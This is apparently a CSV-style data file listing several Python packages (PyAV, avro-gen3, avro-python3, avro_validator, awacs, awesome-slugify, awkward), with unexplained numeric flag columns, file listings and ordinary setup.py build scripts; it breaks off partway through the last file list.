av-9.2.0,0,1,1,1,1,0,0,0,about.py codeccontext.pxd codeccontext.pyx fifo.pxd fifo.pyx format.pxd format.pyx frame.pxd frame.pyx layout.pxd layout.pyx plane.pxd plane.pyx resampler.pxd resampler.pyx stream.pxd stream.pyx __init__.pxd __init__.py buffer.pxd buffer.pyx bytesource.pxd bytesource.pyx codec.pxd codec.pyx context.pxd context.pyx __init__.pxd __init__.py core.pxd core.pyx input.pxd input.pyx output.pxd output.pyx pyio.pxd pyio.pyx streams.pxd streams.pyx __init__.pxd __init__.py stream.pxd stream.pyx __init__.pxd __init__.py datasets.py deprecation.py descriptor.pxd descriptor.pyx dictionary.pxd dictionary.pyx enum.pxd enum.pyx error.pxd error.pyx context.pxd context.pyx filter.pxd filter.pyx graph.pxd graph.pyx link.pxd link.pyx pad.pxd pad.pyx __init__.pxd __init__.py format.pxd format.pyx frame.pxd frame.pyx logging.pxd logging.pyx option.pxd option.pyx packet.pxd packet.pyx plane.pxd plane.pyx motionvectors.pxd motionvectors.pyx sidedata.pxd sidedata.pyx __init__.pxd __init__.py stream.pxd stream.pyx codeccontext.pxd codeccontext.pyx stream.pxd stream.pyx subtitle.pxd subtitle.pyx __init__.pxd __init__.py utils.pxd utils.pyx codeccontext.pxd codeccontext.pyx format.pxd format.pyx frame.pxd frame.pyx plane.pxd plane.pyx reformatter.pxd reformatter.pyx stream.pxd stream.pyx __init__.pxd __init__.py _core.pyx __init__.pxd __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt audio.rst buffer.rst codec.rst container.rst enum.rst error.rst error_table.py filter.rst frame.rst packet.rst plane.rst sidedata.rst stream.rst subtitles.rst time.rst utils.rst video.rst _globals.rst conf.py basics.rst numpy.rst changelog.rst contributors.rst hacking.rst includes.py includes.rst license.rst index.rst caveats.rst installation.rst parse.py remux.py save_keyframes.py thread_type.py barcode.py generate_video.py generate_video_with_pts.py flags.txt libav.pxd avcodec.pxd avdevice.pxd avfilter.pxd avfiltergraph.pxd buffersink.pxd buffersrc.pxd avformat.pxd avutil.pxd channel_layout.pxd dict.pxd error.pxd frame.pxd motion_vector.pxd samplefmt.pxd swresample.pxd swscale.pxd LICENSE.txt MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py codeccontext.c fifo.c format.c frame.c layout.c plane.c resampler.c stream.c buffer.c bytesource.c codec.c context.c core.c input.c output.c pyio.c streams.c stream.c descriptor.c dictionary.c enum.c error.c context.c filter.c graph.c link.c pad.c format.c frame.c logging.c option.c packet.c plane.c motionvectors.c sidedata.c stream.c codeccontext.c stream.c subtitle.c utils.c codeccontext.c format.c frame.c plane.c reformatter.c stream.c _core.c common.py test_audiofifo.py test_audioformat.py test_audioframe.py test_audiolayout.py test_audioresampler.py test_codec.py test_codec_context.py test_containerformat.py test_decode.py test_deprecation.py test_dictionary.py test_doctests.py test_encode.py test_enums.py test_errors.py test_file_probing.py test_filters.py test_logging.py test_options.py test_python_io.py test_seek.py test_streams.py test_subtitles.py test_timeout.py test_videoformat.py test_videoframe.py __init__.py,"import argparse
import os
import pathlib
import platform
import re
import shlex
import subprocess
import sys

from Cython.Build import cythonize
from Cython.Compiler.AutoDocTransforms import EmbedSignature
from setuptools import Extension, find_packages, setup


FFMPEG_LIBRARIES = [
    ""avformat"",
    ""avcodec"",
    ""avdevice"",
    ""avutil"",
    ""avfilter"",
    ""swscale"",
    ""swresample"",
]


# Monkey-patch Cython to not overwrite embedded signatures.
old_embed_signature = EmbedSignature._embed_signature


def new_embed_signature(self, sig, doc):

    # Strip any `self` parameters from the front.
    sig = re.sub(r""\(self(,\s+)?"", ""("", sig)

    # If they both start with the same signature; skip it.
    if sig and doc:
        new_name = sig.split(""("")[0].strip()
        old_name = doc.split(""("")[0].strip()
        if new_name == old_name:
            return doc
        if new_name.endswith(""."" + old_name):
            return doc

    return old_embed_signature(self, sig, doc)


EmbedSignature._embed_signature = new_embed_signature


def get_config_from_directory(ffmpeg_dir):
    """"""
    Get distutils-compatible extension arguments for a specific directory.
    """"""
    if not os.path.isdir(ffmpeg_dir):
        print(""The specified ffmpeg directory does not exist"")
        exit(1)

    include_dir = os.path.join(FFMPEG_DIR, ""include"")
    library_dir = os.path.join(FFMPEG_DIR, ""lib"")
    if not os.path.exists(include_dir):
        include_dir = FFMPEG_DIR
    if not os.path.exists(library_dir):
        library_dir = FFMPEG_DIR

    return {
        ""include_dirs"": [include_dir],
        ""libraries"": FFMPEG_LIBRARIES,
        ""library_dirs"": [library_dir],
    }


def get_config_from_pkg_config():
    """"""
    Get distutils-compatible extension arguments using pkg-config.
    """"""
    try:
        raw_cflags = subprocess.check_output(
            [""pkg-config"", ""--cflags"", ""--libs""]
            + [""lib"" + name for name in FFMPEG_LIBRARIES]
        )
    except FileNotFoundError:
        print(""pkg-config is required for building PyAV"")
        exit(1)
    except subprocess.CalledProcessError:
        print(""pkg-config could not find libraries {}"".format(FFMPEG_LIBRARIES))
        exit(1)

    known, unknown = parse_cflags(raw_cflags.decode(""utf-8""))
    if unknown:
        print(""pkg-config returned flags we don't understand: {}"".format(unknown))
        if ""-pthread"" in unknown:
            print(""Building PyAV against static FFmpeg libraries is not supported."")
        exit(1)

    return known


def parse_cflags(raw_flags):
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument(""-I"", dest=""include_dirs"", action=""append"")
    parser.add_argument(""-L"", dest=""library_dirs"", action=""append"")
    parser.add_argument(""-l"", dest=""libraries"", action=""append"")
    parser.add_argument(""-D"", dest=""define_macros"", action=""append"")
    parser.add_argument(""-R"", dest=""runtime_library_dirs"", action=""append"")

    raw_args = shlex.split(raw_flags.strip())
    args, unknown = parser.parse_known_args(raw_args)
    config = {k: v or [] for k, v in args.__dict__.items()}
    for i, x in enumerate(config[""define_macros""]):
        parts = x.split(""="", 1)
        value = x[1] or None if len(x) == 2 else None
        config[""define_macros""][i] = (parts[0], value)
    return config, "" "".join(shlex.quote(x) for x in unknown)


# Parse command-line arguments.
FFMPEG_DIR = None
for i, arg in enumerate(sys.argv):
    if arg.startswith(""--ffmpeg-dir=""):
        FFMPEG_DIR = arg.split(""="")[1]
        del sys.argv[i]

# Do not cythonize or use pkg-config when cleaning.
use_pkg_config = platform.system() != ""Windows""
if len(sys.argv) > 1 and sys.argv[1] == ""clean"":
    cythonize = lambda ext, **kwargs: [ext]
    use_pkg_config = False

# Locate FFmpeg libraries and headers.
if FFMPEG_DIR is not None:
    extension_extra = get_config_from_directory(FFMPEG_DIR)
elif use_pkg_config:
    extension_extra = get_config_from_pkg_config()
else:
    extension_extra = {
        ""include_dirs"": [],
        ""libraries"": FFMPEG_LIBRARIES,
        ""library_dirs"": [],
    }

# Construct the modules that we find in the ""av"" directory.
ext_modules = []
for dirname, dirnames, filenames in os.walk(""av""):
    for filename in filenames:
        # We are looking for Cython sources.
        if filename.startswith(""."") or os.path.splitext(filename)[1] != "".pyx"":
            continue

        pyx_path = os.path.join(dirname, filename)
        base = os.path.splitext(pyx_path)[0]

        # Need to be a little careful because Windows will accept / or \
        # (where os.sep will be \ on Windows).
        mod_name = base.replace(""/"", ""."").replace(os.sep, ""."")

        # Cythonize the module.
        ext_modules += cythonize(
            Extension(
                mod_name,
                include_dirs=extension_extra[""include_dirs""],
                libraries=extension_extra[""libraries""],
                library_dirs=extension_extra[""library_dirs""],
                sources=[pyx_path],
            ),
            compiler_directives=dict(
                c_string_type=""str"",
                c_string_encoding=""ascii"",
                embedsignature=True,
                language_level=2,
            ),
            build_dir=""src"",
            include_path=[""include""],
        )


# Read package metadata
about = {}
about_file = os.path.join(os.path.dirname(__file__), ""av"", ""about.py"")
with open(about_file, encoding=""utf-8"") as fp:
    exec(fp.read(), about)

package_folders = pathlib.Path(""av"").glob(""**/"")
package_data = {""."".join(pckg.parts): [""*.pxd""] for pckg in package_folders}


setup(
    name=""av"",
    version=about[""__version__""],
    description=""Pythonic bindings for FFmpeg's libraries."",
    author=""Mike Boers"",
    author_email=""pyav@mikeboers.com"",
    url=""https://github.com/PyAV-Org/PyAV"",
    packages=find_packages(exclude=[""build*"", ""examples*"", ""scratchpad*"", ""tests*""]),
    package_data=package_data,
    zip_safe=False,
    ext_modules=ext_modules,
    test_suite=""tests"",
    entry_points={
        ""console_scripts"": [
            ""pyav = av.__main__:main"",
        ],
    },
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: POSIX"",
        ""Operating System :: Unix"",
        ""Operating System :: Microsoft :: Windows"",
        ""Programming Language :: Cython"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
        ""Topic :: Multimedia :: Sound/Audio"",
        ""Topic :: Multimedia :: Sound/Audio :: Conversion"",
        ""Topic :: Multimedia :: Video"",
        ""Topic :: Multimedia :: Video :: Conversion"",
    ],
)
",0
avro-gen-0.3.0,0,1,1,1,1,0,0,0,avrojson.py core_writer.py dict_wrapper.py logical.py namespace.py protocol.py protocol_writer.py schema.py tabbed_writer.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,,1
avro-gen3-0.7.4,0,1,1,1,1,0,1,0,avrojson.py core_writer.py dict_wrapper.py logical.py namespace.py protocol.py protocol_writer.py py.typed schema.py tabbed_writer.py __init__.py __main__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py,"""""""
A setuptools-based setup module.

See:
https://github.com/hsheth2/avro_gen
""""""

from setuptools import setup, find_packages
from codecs import open
from os import path

here = path.abspath(path.dirname(__file__))

# Get the long description from the README file
if path.exists(path.join(here, 'README.md')):
    with open(path.join(here, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
else:
    long_description = ''

setup(
    name='avro-gen3',
    version='0.7.4',

    description='Avro record class and specific record reader generator',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/acryldata/avro_gen',
    author='Harshal Sheth',
    author_email='hsheth2@gmail.com',
    license='License :: OSI Approved :: Apache Software License',

    classifiers=[
        # How mature is this project? Common values are
        #   3 - Alpha
        #   4 - Beta
        #   5 - Production/Stable
        'Development Status :: 4 - Beta',

        # Indicate who your project is intended for
        'Intended Audience :: Developers',

        # Pick your license as you wish (should match ""license"" above)
        'License :: OSI Approved :: Apache Software License',

        # Specify the Python versions you support here. In particular, ensure
        # that you indicate whether you support Python 2, Python 3 or both.
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],

    keywords='avro class generator',

    # You can just specify the packages manually here if your project is
    # simple. Or you can use find_packages().
    packages=find_packages(exclude=['contrib', 'docs', 'tests']),
    package_data={
        'avrogen': ['py.typed'],
    },
    install_requires=[
        ""avro>=1.10"",
        'six',
        'tzlocal',
        'pytz',
    ],
)
",1
avro-serializer-1.0.4,0,1,1,1,0,0,1,0,,,1
avro-python3-1.10.2,0,1,1,1,1,0,0,0,datafile.py HandshakeRequest.avsc HandshakeResponse.avsc io.py ipc.py LICENSE NOTICE protocol.py schema.py schemanormalization.py tool.py VERSION.txt __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe MANIFEST.in PKG-INFO README.md avro setup.cfg setup.py,"#!/usr/bin/env python
# -*- mode: python -*-
# -*- coding: utf-8 -*-

# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Provide the code necessary for packaging and installing avro-python3.

The avro-python3 software is designed for Python 3, but this file and the packaging software supports Python 2.7.

https://pypi.org/project/avro-python3/
""""""

import distutils.command.clean
import distutils.dir_util
import distutils.errors
import distutils.file_util
import distutils.log
import fnmatch
import glob
import os
import subprocess

import setuptools

_HERE = os.path.dirname(os.path.abspath(__file__))
_AVRO_DIR = os.path.join(_HERE, 'avro')
_VERSION_FILE_NAME = 'VERSION.txt'

def _is_distribution():
    """"""Tests whether setup.py is invoked from a distribution.

    Returns:
        True if setup.py runs from a distribution.
        False otherwise, ie. if setup.py runs from a version control work tree.
    """"""
    # If a file PKG-INFO exists as a sibling of setup.py,
    # assume we are running as source distribution:
    return os.path.exists(os.path.join(_HERE, 'PKG-INFO'))


def _generate_package_data():
    """"""Generate package data.

    This data will already exist in a distribution package,
    so this function only runs for local version control work tree.
    """"""
    distutils.log.info('Generating package data')

    # Avro top-level source directory:
    root_dir = os.path.dirname(os.path.dirname(_HERE))

    # Create a PEP440 compliant version file.
    version_file_path = os.path.join(root_dir, 'share', _VERSION_FILE_NAME)
    with open(version_file_path) as vin:
        version = vin.read().replace('-', '+')
    with open(os.path.join(_AVRO_DIR, _VERSION_FILE_NAME), 'w') as vout:
        vout.write(version)

    # Copy necessary avsc files:
    avsc_files = (
        (('schemas', 'org', 'apache', 'avro', 'ipc', 'HandshakeRequest.avsc'), ''),
        (('schemas', 'org', 'apache', 'avro', 'ipc', 'HandshakeResponse.avsc'), ''),
        (('test', 'schemas', 'interop.avsc'), ('tests',)),
    )

    for src, dst in avsc_files:
        src = os.path.join(root_dir, 'share', *src)
        dst = os.path.join(_AVRO_DIR, *dst)
        distutils.file_util.copy_file(src, dst)


class CleanCommand(distutils.command.clean.clean):
    """"""A command to clean up install artifacts and replaceable, generated files.""""""

    def _replaceable(self):
        """"""Get the list of files to delete.""""""
        for name in ('dist', 'avro_python3.egg-info', os.path.join(_AVRO_DIR, _VERSION_FILE_NAME)):
            if os.path.exists(name):
                yield name
        for root, dirnames, filenames in os.walk(_AVRO_DIR):
            if '__pycache__' in dirnames:
                dirnames.remove('__pycache__')
                yield os.path.join(root, '__pycache__')
            for name in fnmatch.filter(filenames, '*.avsc'):
                yield os.path.join(root, name)

    def run(self):
        super().run()
        for name in self._replaceable():
            if self.dry_run:
                distutils.log.info('Would remove %s', name)
            elif os.path.isdir(name):
                # distutils logs this for us
                distutils.dir_util.remove_tree(name)
            else:
                distutils.log.info('Removing %s', name)
                os.remove(name)


class GenerateInteropDataCommand(setuptools.Command):
    """"""A command to generate Avro files for data interop test.""""""

    user_options = [
      ('schema-file=', None, 'path to input Avro schema file'),
      ('output-path=', None, 'path to output Avro data files'),
    ]

    def initialize_options(self):
        self.schema_file = os.path.join(os.getcwd(), 'interop.avsc')
        self.output_path = os.getcwd()

    def finalize_options(self):
        pass

    def run(self):
        from avro.tests import gen_interop_data
        gen_interop_data.generate(self.schema_file, self.output_path)


class LintCommand(setuptools.Command):
    """"""Run pycodestyle on all your modules""""""
    description = __doc__
    user_options = []

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        # setuptools does not seem to make pycodestyle available
        # in the pythonpath, so we do it ourselves.
        try:
            env = {'PYTHONPATH': next(glob.iglob('.eggs/pycodestyle-*.egg'))}
        except StopIteration:
            env = None  # pycodestyle is already installed
        try:
            subprocess.run(['python3', '-m', 'pycodestyle', '.'], env=env, check=True)
        except subprocess.CalledProcessError:
            raise distutils.errors.DistutilsError(""pycodestyle exited with a nonzero exit code."")


def main():
    if not _is_distribution():
        _generate_package_data()

    setuptools.setup(cmdclass={
        ""clean"": CleanCommand,
        ""generate_interop_data"": GenerateInteropDataCommand,
        ""lint"": LintCommand,
    })


if __name__ == '__main__':
    main()
",1
avro_validator-1.2.1,0,1,1,1,1,0,0,0,avro_types.py cli.py schema.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py,"import setuptools

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""avro_validator"",
    version=""1.2.1"",
    author=""Leonardo de Campos Almeida"",
    author_email=""leocalm@gmail.com"",
    description=""Pure python avro schema validator"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    url=""https://github.com/leocalm/avro_validator"",
    packages=setuptools.find_packages(),
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    python_requires='>=3.6',
    install_requires=[],
    extras_require={
        ""dev"": [
            ""pytest"",
            ""coverage"",
            ""tox"",
            ""flake8"",
            ""hypothesis"",
            ""pytest-cov"",
            ""python-coveralls"",
        ],
        ""docs"": [
            ""sphinx"",
            ""pallets-sphinx-themes"",
            ""sphinxcontrib-log-cabinet"",
            ""sphinx-issues"",
        ],
    },
    keywords=""avro schema"",
    project_urls={
        ""Repository"": ""https://github.com/leocalm/avro_validator"",
        ""Bug Reports"": ""https://github.com/leocalm/avro_validator/issues"",
        ""Documentation"": ""https://avro-validator.readthedocs.io/"",
    },
    entry_points={
        ""console_scripts"": [""avro_validator=avro_validator.cli:main""]
    },
)
",1
awacs-2.2.0,0,1,1,1,1,0,0,0,.gitignore a4b.py access_analyzer.py account.py acm.py acm_pca.py activate.py airflow.py amplify.py amplifybackend.py amplifyuibuilder.py apigateway.py appconfig.py appflow.py applicationinsights.py application_autoscaling.py application_cost_profiler.py appmesh.py appmesh_preview.py apprunner.py appstream.py appsync.py app_integrations.py aps.py arsenal.py artifact.py athena.py auditmanager.py autoscaling.py autoscaling_plans.py aws.py awsconnector.py awslambda.py aws_marketplace.py aws_marketplace_management.py aws_portal.py backup.py backup_gateway.py backup_storage.py batch.py billingconductor.py braket.py budgets.py bugbust.py cassandra.py ce.py chatbot.py chime.py cloud9.py clouddirectory.py cloudformation.py cloudfront.py cloudhsm.py cloudsearch.py cloudshell.py cloudtrail.py cloudwatch.py codeartifact.py codebuild.py codecommit.py codedeploy.py codedeploy_commands_secure.py codeguru.py codeguru_profiler.py codeguru_reviewer.py codepipeline.py codestar.py codestar_connections.py codestar_notifications.py cognito_identity.py cognito_idp.py cognito_sync.py comprehend.py comprehendmedical.py compute_optimizer.py config.py connect.py connect_campaigns.py controltower.py crowd.py cur.py databrew.py dataexchange.py datapipeline.py datasync.py dax.py dbqms.py deepcomposer.py deeplens.py deepracer.py detective.py devicefarm.py devops_guru.py directconnect.py discovery.py dlm.py dms.py drs.py ds.py dynamodb.py ebs.py ec2.py ec2messages.py ec2_instance_connect.py ecr.py ecr_public.py ecs.py eks.py elasticache.py elasticbeanstalk.py elasticfilesystem.py elasticloadbalancing.py elasticmapreduce.py elastictranscoder.py elastic_inference.py elemental_activations.py elemental_appliances_software.py elemental_support_cases.py elemental_support_content.py emr_containers.py emr_serverless.py es.py events.py evidently.py execute_api.py finspace.py firehose.py fis.py fms.py forecast.py frauddetector.py freertos.py fsx.py gamelift.py gamesparks.py geo.py glacier.py globalaccelerator.py glue.py grafana.py greengrass.py groundstation.py groundtruthlabeling.py guardduty.py health.py healthlake.py trust.py __init__.py honeycode.py iam.py identitystore.py identity_sync.py imagebuilder.py importexport.py inspector.py inspector2.py iot.py iot1click.py iotanalytics.py iotdeviceadvisor.py iotevents.py iotfleethub.py iotfleetwise.py iotjobsdata.py iotroborunner.py iotsitewise.py iotthingsgraph.py iottwinmaker.py iotwireless.py iot_device_tester.py iq.py iq_permission.py ivs.py ivschat.py kafka.py kafkaconnect.py kafka_cluster.py kendra.py kinesis.py kinesisanalytics.py kinesisvideo.py kms.py lakeformation.py launchwizard.py lex.py license_manager.py lightsail.py logs.py lookoutequipment.py lookoutmetrics.py lookoutvision.py m2.py machinelearning.py macie.py macie2.py managedblockchain.py marketplacecommerceanalytics.py mechanicalturk.py mediaconnect.py mediaconvert.py mediaimport.py medialive.py mediapackage.py mediapackage_vod.py mediastore.py mediatailor.py memorydb.py mgh.py mgn.py migrationhub_orchestrator.py migrationhub_strategy.py mobileanalytics.py mobilehub.py mobiletargeting.py monitron.py mq.py neptune_db.py networkmanager.py network_firewall.py nimble.py opsworks.py opsworks_cm.py organizations.py outposts.py panorama.py personalize.py pi.py polly.py pricing.py profile.py proton.py purchase_orders.py py.typed qldb.py quicksight.py ram.py rbin.py rds.py rds_data.py rds_db.py redshift.py redshift_data.py redshift_serverless.py refactor_spaces.py rekognition.py resiliencehub.py resource_explorer.py resource_groups.py rhelkb.py robomaker.py rolesanywhere.py route53.py route53domains.py route53resolver.py route53_recovery_cluster.py route53_recovery_control_config.py route53_recovery_readiness.py rum.py s3.py s3_object_lambda.py s3_outposts.py sagemaker.py sagemaker_groundtruth_synthetic.py savingsplans.py schemas.py sdb.py secretsmanager.py securityhub.py serverlessrepo.py servicecatalog.py servicediscovery.py serviceextract.py servicequotas.py ses.py shield.py signer.py simscape.py sms.py sms_voice.py snowball.py snow_device_management.py sns.py sqlworkbench.py sqs.py ssm.py ssmmessages.py ssm_contacts.py ssm_guiconnect.py ssm_incidents.py sso.py sso_directory.py states.py storagegateway.py sts.py sumerian.py support.py sustainability.py swf.py synthetics.py tag.py tax.py textract.py timestream.py tiros.py transcribe.py transfer.py translate.py trustedadvisor.py voiceid.py waf.py wafv2.py waf_regional.py wam.py wellarchitected.py wisdom.py workdocs.py worklink.py workmail.py workmailmessageflow.py workspaces.py workspaces_web.py xray.py __init__.py dependency_links.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.md CODE_OF_CONDUCT.md ecr.py ecs.py s3.py simple_test.py sns.py sqs.py LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst RELEASE.md setup.cfg setup.py test_aws.py test_base.py test_conditions.py test_ec2.py test_equality.py test_examples.py test_helpers.py test_iam.py test_s3.py __init__.py tox.ini,"from setuptools import setup

setup()
",1
awesome-slugify-1.6.5,0,1,1,1,0,0,0,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py alt_translates.py main.py tests.py __init__.py,"# coding=utf8

from setuptools import setup, find_packages


setup(
    name='awesome-slugify',
    version='1.6.5',

    author='Dmitry Voronin',
    author_email='dimka665@gmail.com',

    url='https://github.com/dimka665/awesome-slugify',
    description='Python flexible slugify function',

    packages=find_packages(),
    install_requires=[
        'regex',
        'Unidecode>=0.04.14,<0.05',
    ],

    license='GNU GPLv3',
    classifiers=[
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
    ],
    keywords='slugify slug transliteration russian german unicode translation flexible',
)
",1
awkward-1.8.0,0,1,1,1,0,0,0,0,CMakeLists.txt CONTRIBUTING.md generate-kernel-signatures.py numpy_dlpack.c Config.cmake.in CMakeLists.txt dlpackcpp.h mock_c.c mock_main.cc Doxyfile.in dlpack.h LICENSE BitMaskedArray.h ByteMaskedArray.h EmptyArray.h IndexedArray.h ListArray.h ListOffsetArray.h None.h NumpyArray.h Record.h RecordArray.h RegularArray.h UnionArray.h UnmaskedArray.h VirtualArray.h ArrayBuilder.h ArrayBuilderOptions.h BoolBuilder.h Builder.h Complex128Builder.h DatetimeBuilder.h Float64Builder.h GrowableBuffer.h Int64Builder.h ListBuilder.h OptionBuilder.h RecordBuilder.h StringBuilder.h TupleBuilder.h UnionBuilder.h UnknownBuilder.h common.h Content.h cuda-utils.h datetime_util.h ForthInputBuffer.h ForthMachine.h ForthOutputBuffer.h SpecializedJSON.h Identities.h Index.h json.h uproot.h Iterator.h kernel-dispatch.h kernel-utils.h BitMaskedArrayBuilder.h ByteMaskedArrayBuilder.h EmptyArrayBuilder.h FormBuilder.h IndexedArrayBuilder.h IndexedOptionArrayBuilder.h LayoutBuilder.h ListArrayBuilder.h ListOffsetArrayBuilder.h NumpyArrayBuilder.h RecordArrayBuilder.h RegularArrayBuilder.h UnionArrayBuilder.h UnmaskedArrayBuilder.h IrregularlyPartitionedArray.h PartitionedArray.h content.h dlpack_util.h forms.h forth.h identities.h index.h io.h kernel_utils.h partition.h startup.h types.h util.h virtual.h Reducer.h Slice.h ArrayType.h ListType.h OptionType.h PrimitiveType.h RecordType.h RegularType.h Type.h UnionType.h UnknownType.h util.h ArrayCache.h ArrayGenerator.h kernel-specification.yml LICENSE MANIFEST.in PKG-INFO CMakeLists.txt attr.h buffer_info.h cast.h chrono.h common.h complex.h class.h common.h descr.h init.h internals.h typeid.h type_caster_base.h eigen.h embed.h eval.h functional.h gil.h iostream.h numpy.h operators.h options.h pybind11.h pytypes.h filesystem.h stl.h stl_bind.h LICENSE check-style.sh cmake_uninstall.cmake.in FindCatch.cmake FindEigen3.cmake FindPythonLibsNew.cmake libsize.py make_changelog.py pybind11Common.cmake pybind11Config.cmake.in pybind11NewTools.cmake pybind11Tools.cmake pyproject.toml setup_global.py.in setup_main.py.in pyproject.toml CMakeLists.txt FindGTestSrc.cmake CMakeLists.txt Doxyfile.in Doxyfile.zh-cn.in CMakeLists.txt allocators.h document.h encodedstream.h encodings.h en.h error.h filereadstream.h filewritestream.h fwd.h biginteger.h diyfp.h dtoa.h ieee754.h itoa.h meta.h pow10.h regex.h stack.h strfunc.h strtod.h swap.h istreamwrapper.h memorybuffer.h memorystream.h inttypes.h stdint.h ostreamwrapper.h pointer.h prettywriter.h rapidjson.h reader.h schema.h stream.h stringbuffer.h writer.h license.txt RapidJSON.pc.in RapidJSONConfig.cmake.in RapidJSONConfigVersion.cmake.in CMakeLists.txt CMakeLists.txt CMakeLists.txt README-pypi.md README.md requirements-dev.txt requirements-test.txt requirements.txt runtime.txt setup.cfg setup.py categorical.py mixins.py string.py __init__.py config.py forms.py forth.py highlevel.py layout.py nplike.py convert.py describe.py reducers.py structure.py __init__.py partition.py types.py _autograd.py jax_utils.py __init__.py arrayview.py builder.py layout.py __init__.py _numexpr.py _numpy.py _uproot.py __init__.py _cpu_kernels.py _cuda_kernels.py _io.py _libawkward.py generated_parser.py parser.py __init__.py _util.py categorical.py mixins.py string.py __init__.py bitmaskedarray.py bytemaskedarray.py content.py emptyarray.py indexedarray.py indexedoptionarray.py listarray.py listoffsetarray.py numpyarray.py recordarray.py regulararray.py unionarray.py unmaskedarray.py __init__.py bitmaskedform.py bytemaskedform.py emptyform.py form.py indexedform.py indexedoptionform.py listform.py listoffsetform.py numpyform.py recordform.py regularform.py unionform.py unmaskedform.py __init__.py highlevel.py identifier.py index.py numba.py ak_from_arrow.py ak_from_arrow_schema.py ak_from_buffers.py ak_from_cupy.py ak_from_iter.py ak_from_jax.py ak_from_json.py ak_from_json_schema.py ak_from_numpy.py ak_from_parquet.py ak_to_arrow.py ak_to_arrow_table.py ak_to_buffers.py ak_to_cupy.py ak_to_jax.py ak_to_json.py ak_to_layout.py ak_to_list.py ak_to_numpy.py ak_to_pandas.py ak_to_parquet.py __init__.py ak_backend.py ak_fields.py ak_is_valid.py ak_parameters.py ak_to_backend.py ak_type.py ak_validity_error.py __init__.py ak_from_json_file.py ak_from_parquet.py ak_to_json_file.py ak_to_parquet.py __init__.py ak_all.py ak_any.py ak_argmax.py ak_argmin.py ak_corr.py ak_count.py ak_count_nonzero.py ak_covar.py ak_linear_fit.py ak_max.py ak_mean.py ak_min.py ak_moment.py ak_prod.py ak_ptp.py ak_softmax.py ak_std.py ak_sum.py ak_var.py __init__.py ak_argcartesian.py ak_argcombinations.py ak_argsort.py ak_broadcast_arrays.py ak_cartesian.py ak_combinations.py ak_concatenate.py ak_copy.py ak_fill_none.py ak_firsts.py ak_flatten.py ak_from_regular.py ak_full_like.py ak_isclose.py ak_is_none.py ak_local_index.py ak_mask.py ak_nan_to_num.py ak_num.py ak_ones_like.py ak_packed.py ak_pad_none.py ak_ravel.py ak_run_lengths.py ak_singletons.py ak_sort.py ak_strings_astype.py ak_to_regular.py ak_unflatten.py ak_unzip.py ak_values_astype.py ak_where.py ak_without_parameters.py ak_with_field.py ak_with_name.py ak_with_parameter.py ak_zeros_like.py ak_zip.py __init__.py __init__.py record.py tmp_for_testing.py arraytype.py listtype.py numpytype.py optiontype.py recordtype.py regulartype.py type.py uniontype.py unknowntype.py __init__.py _broadcasting.py cling.py __init__.py arrayview.py builder.py layout.py __init__.py numexpr.py numpy.py pyarrow.py __init__.py _lookup.py _prettyprint.py _reducers.py _slicing.py _typetracer.py _util.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt __init__.py allocators.cpp awkward_argsort.cpp awkward_BitMaskedArray_to_ByteMaskedArray.cpp awkward_BitMaskedArray_to_IndexedOptionArray.cpp awkward_ByteMaskedArray_getitem_carry.cpp awkward_ByteMaskedArray_getitem_nextcarry.cpp awkward_ByteMaskedArray_getitem_nextcarry_outindex.cpp awkward_ByteMaskedArray_mask.cpp awkward_ByteMaskedArray_numnull.cpp awkward_ByteMaskedArray_overlay_mask.cpp awkward_ByteMaskedArray_reduce_next_64.cpp awkward_ByteMaskedArray_reduce_next_nonlocal_nextshifts_64.cpp awkward_ByteMaskedArray_reduce_next_nonlocal_nextshifts_fromshifts_64. awkward_ByteMaskedArray_toIndexedOptionArray.cpp awkward_carry_arange.cpp awkward_combinations.cpp 